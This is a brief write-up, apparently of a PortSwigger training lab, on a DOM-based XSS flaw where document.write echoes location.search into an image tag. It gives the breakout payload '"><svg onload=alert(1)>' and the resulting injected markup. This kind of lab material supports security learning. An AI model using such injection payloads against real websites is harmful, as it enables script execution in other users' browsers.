# DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

![image](https://github.com/offensivecyber03/PortSwigger/assets/71892943/4e6031e4-3e3c-4169-9062-636c7c5b4b26)

DOM invader shos how function used 
```bash
<img src="/resources/images/tracker.gif?searchTerms=mpk7ctdm">
```
as a result malicious payload will be `"><svg onload=alert(1)>` because in the end final payload will be:
```bash
<img src="/resources/images/tracker.gif?searchTerms=mpk7ctdm"><svg onload=alert(1)>
```
